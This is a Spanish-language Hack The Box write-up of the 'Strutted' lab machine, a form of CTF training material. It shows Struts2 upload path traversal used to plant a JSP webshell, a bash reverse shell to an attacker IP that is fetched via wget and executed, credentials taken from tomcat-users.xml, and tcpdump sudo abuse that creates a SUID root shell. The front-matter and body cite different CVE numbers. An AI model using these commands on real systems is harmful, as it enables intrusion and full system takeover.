---
title: Strutted
description: Strutted es una máquina Linux de dificultad media que presenta un sitio web de una empresa que ofrece soluciones de alojamiento de imágenes. El sitio proporciona un contenedor Docker con una versión de Apache Struts vulnerable a CVE-2024-53677, lo que permite obtener acceso inicial al sistema. Una enumeración más profunda revela el archivo tomcat-users.xml con una contraseña en texto plano que se utiliza para autenticarse como james. Para escalar privilegios, se abusa de tcpdump al ejecutarse con sudo para crear una copia del binario de bash con el bit SUID activado, lo que permite obtener una shell como root.
date: 2025-04-27
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-strutted/strutted_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - ssh
  - http
  - cve
  - path_traversal
  - rce
  - interactive_tty
  - data_leaks
  - sudo_abuse
  - suid
  - information_gathering
  - web_analysis
  - foothold
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ ping -c 1 10.10.11.59
PING 10.10.11.59 (10.10.11.59) 56(84) bytes of data.
64 bytes from 10.10.11.59: icmp_seq=1 ttl=63 time=170 ms

--- 10.10.11.59 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 170.089/170.089/170.089/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.59 -n -Pn -oG nmap1
Host: 10.10.11.59 ()    Status: Up
Host: 10.10.11.59 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.59 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/strutted:-$ echo '10.10.11.59\tstrutted.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/strutted:-$ whatweb strutted.htb
http://strutted.htb [200 OK] Bootstrap, Content-Language[en-US], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[JSESSIONID], IP[10.10.11.59], Java, Script, Title[Strutted™ - Instant Image Uploads], UncommonHeaders[cross-origin-embedder-policy-report-only,cross-origin-opener-policy], nginx[1.18.0]
```

---
## Web Analysis

El sitio principal se presenta como una plataforma sencilla para subir imágenes y obtener enlaces compartibles de forma instantánea. La página está desplegada sobre un servidor Nginx en Ubuntu, con una aplicación Java corriendo en segundo plano.

![](assets/img/htb-writeup-strutted/strutted1_1.png)
![](assets/img/htb-writeup-strutted/strutted1_2.png)
![](assets/img/htb-writeup-strutted/strutted1_3.png)

El botón `Download` en la interfaz principal permite descargar un archivo comprimido, el cual contiene el código fuente de la aplicación.

![](assets/img/htb-writeup-strutted/strutted1_4.png)

Dentro del archivo `pom.xml`, se identifica que la aplicación utiliza Apache Struts2 en su versión 6.3.0.1.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ cat strutted/pom.xml
```

![](assets/img/htb-writeup-strutted/strutted1_5.png)

Además, al revisar el `Dockerfile` incluido en el mismo paquete, se confirma que la aplicación corre sobre un contenedor basado en openjdk:17-jdk-alpine y es desplegada en Tomcat 9.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ cat Dockerfile
```

![](assets/img/htb-writeup-strutted/strutted1_6.png)

Con la información obtenida hasta el momento, identifiqué que la aplicación podría ser vulnerable a [CVE-2023-50164](https://nvd.nist.gov/vuln/detail/cve-2023-50164). Esta vulnerabilidad afecta a Apache Struts2 y permite a un atacante manipular los parámetros de subida de archivos para lograr un path traversal. Esto puede permitir la carga de archivos maliciosos y conduzcan a una ejecución remota de código.

---
## Foothold

Para explotar esta vulnerabilidad. Primero, se intercepta la solicitud generada al subir una imagen a través de la interfaz web. Luego, se modifica el nombre del campo de carga `upload variable name` o `name` para que comience con una letra mayúscula. Este comportamiento específico es el que activa la ruta vulnerable en Struts2.

La explotación se realiza apuntando al endpoint `upload.action`, utilizando tres variables:

* Ruta del endpoint vulnerable: `/upload.action`
* Nombre del parámetro del archivo a subir: `Upload`
* Nombre del archivo "file name parameter": `UploadFileName`

Después, se aplica un path traversal modificando el nombre del archivo a una ruta como `../../test.txt`, lo cual permite escribir el contenido del archivo en un directorio arbitrario dentro del sistema de archivos del servidor. En este caso, el contenido de la imagen cargada queda almacenado directamente en el directorio raíz de la aplicación.

Este comportamiento confirma que la aplicación es vulnerable al CVE mencionado y permite continuar con la carga de un archivo malicioso para obtener una shell remota.

{% include embed/video.html src='assets/img/htb-writeup-strutted/strutted2_1.webm' types='webm' title='CVE-2023-50164 Test' autoplay=true loop=true muted=true %}

Una vez confirmada la vulnerabilidad, en lugar de subir un archivo TXT con el contenido de la imagen, procedí a cargar una webshell para lograr ejecución remota de comandos. Utilicé la [tennc-webshell](https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp), una shell en JSP sencilla que permite ejecutar comandos del sistema a través de un campo de texto en una interfaz web.

Al acceder a `http://strutted.htb/shell.jsp`, se presenta un campo de entrada que permite ejecutar comandos de forma arbitraria en el sistema, confirmando así la ejecución remota de código.

{% include embed/video.html src='assets/img/htb-writeup-strutted/strutted3_1.webm' types='webm' title='CVE-2023-50164 Exploitation' autoplay=true loop=true muted=true %}

Generé una reverse shell y lo expuse mediante un servidor HTTP en mi máquina de atacante.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.15.88/4321 0>&1' > revsh.sh
```

```terminal
/home/kali/Documents/htb/machines/strutted:-$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Desde la webshell, descargué el script al sistema de la víctima y le otorgué permisos de ejecución.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ curl http://strutted.htb/shell.jsp?cmd=wget%20http://10.10.15.88:8000/revsh.sh%20-O%20/tmp/revsh.sh
/home/kali/Documents/htb/machines/strutted:-$ curl http://strutted.htb/shell.jsp?cmd=chmod%20%2Bx%20/tmp/revsh.sh
```

```terminal
/home/kali/Documents/htb/machines/strutted:-$ sudo rlwrap nc -lnvp 4321
	listening on [any] 4321 ...
```

Me puse a es escuchá por el puerto configurado y finalmente ejecuté el script para establecer la conexion.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ curl http://strutted.htb/shell.jsp?cmd=/bin/bash%20/tmp/revsh.sh

	... connect to [10.10.15.88] from (UNKNOWN) [10.10.11.59] 50252

tomcat@strutted:~$ id
uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
```

---
## Lateral Movement

```terminal
tomcat@strutted:~$ script /dev/null -c bash
tomcat@strutted:~$ export TERM=xterm
tomcat@strutted:~$ export SHELL=bash
```

Listé los usuarios con shell interactiva en el sistema y el usuario `james` destacó como potencial objetivo.

```terminal
tomcat@strutted:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
```

Busqué archivos pertenecientes al grupo tomcat `GID 998`.

```terminal
tomcat@strutted:~$ find / -group 998 2>/dev/null | grep -v '/proc/\|/var/\|/tmp/'
```

![](assets/img/htb-writeup-strutted/strutted4_1.png)

Dentro de `/etc/tomcat9/`, encontré el archivo `tomcat-users.xml`, que contené credenciales de un usuario administrador del panel web de Tomcat.

```terminal
tomcat@strutted:~$ grep -rE 'password=' /etc/tomcat9/ 2>/dev/null
```

![](assets/img/htb-writeup-strutted/strutted4_2.png)

Probé estas credenciales para acceder vía SSH como el usuario `james`, lo cual fue exitoso.

```terminal
/home/kali/Documents/htb/machines/strutted:-$ ssh james@strutted.htb
james@strutted.htb's password: IT14d6SSP81k

james@strutted:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)

james@strutted:~$ cat user.txt
```

---
## Privilege Escalation

Al revisar los permisos `sudo` del usuario `james`, encuentro que puede ejecutar tcpdump como `root` sin contraseña.

```terminal
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

Según [GTFOBins](https://gtfobins.github.io/gtfobins/tcpdump/#sudo), es posible abusar de tcpdump con `sudo` para ejecutar un binario arbitrario como `root` mediante las flags `-z` y `-Z`.

Genero un payload que copia `/bin/bash` a `/tmp/bash_root` y activa el bit SUID.

```terminal
james@strutted:~$ COMMAND='cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
```

Ejecutando tcpdump con la interfaz loopback, genero una captura que se detiene tras 1 segundo y rota una única vez, lo que provoca la ejecución del payload.

```terminal
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
```

Con el binario SUID en `/tmp`, accedo a una shell con privilegios de `root`.

```terminal
james@strutted:~$ /tmp/bash_root -p

bash_root-5.1# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),27(sudo),1000(james)

bash_root-5.1# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/644" target="_blank">Strutted Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
